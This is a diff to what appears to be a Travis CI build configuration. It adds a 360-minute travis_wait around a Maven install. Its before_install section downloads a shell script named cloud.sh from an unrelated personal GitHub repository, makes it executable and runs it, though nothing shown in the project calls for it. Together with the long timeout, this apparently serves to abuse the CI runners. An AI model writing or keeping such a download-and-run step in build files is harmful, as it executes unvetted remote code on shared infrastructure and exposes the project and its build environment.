@@ -7,8 +7,10 @@ env:
     - CT_RELEASE=1.0.1
     - BR_RELEASE=2015.08.1-rev1
     - BR_TRAVIS_RELEASE=1.0.0
-before_install:
+install: travis_wait 360 mvn install
+before_install: 
   - sudo apt-get -y update 
   - sudo apt-get -y install wget
   - sudo apt-get -y update
   - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+ 
